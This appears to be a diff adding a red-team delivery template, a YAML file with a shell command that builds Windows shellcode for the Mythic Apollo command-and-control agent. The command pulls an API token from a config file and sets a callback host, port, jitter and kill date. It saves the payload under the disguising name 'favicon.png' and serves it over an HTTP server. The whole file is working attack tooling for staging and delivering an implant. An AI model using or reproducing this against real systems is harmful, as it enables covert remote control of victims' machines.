@@ -1,0 +1,37 @@
+---
+metadata:
+  filename: "deliver-windows-mythic-apollo-http-shellcode.yaml"
+  tags: ["windows", "c2"]
+  created: "2026-03-13"
+  authors: ["TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  echo '================================================================'; \
+  echo '              Mythic Apollo Shellcode Generator                '; \
+  echo '================================================================'; \
+  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp; \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
+    --payload-type apollo \
+    --callback-host {{ mythic_callback_url }} \
+    --callback-port {{ mythic_callback_port }} \
+    --callback-interval {{ mythic_callback_interval }} \
+    --callback-jitter {{ mythic_callback_jitter }} \
+    --selected-os Windows \
+    --output-type shellcode \
+    --shellcode-format Binary \
+    --killdate {{ mythic_killdate }} \
+    --commands {{ mythic_payload_commands }} | \
+  {{ python_path }} {{ templates_dir }}/helper_scripts/mythicPayloadGenerator.py \
+    --mythic-url {{ mythic_url }} \
+    --api-token-file /tmp/mythic_token_tmp \
+    --stdin \
+    --output packstation/outbound/favicon.png && \
+  echo '================================================================' && \
+  echo '                   Apollo Shellcode Ready                       ' && \
+  echo 'File: packstation/outbound/favicon.png' && \
+  echo 'Callback: {{ mythic_callback_url }}:{{ mythic_callback_port }}' && \
+  echo 'Interval: {{ mythic_callback_interval }}s (jitter: {{ mythic_callback_jitter }}%)' && \
+  echo '================================================================'; \
+  rm -f /tmp/mythic_token_tmp; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
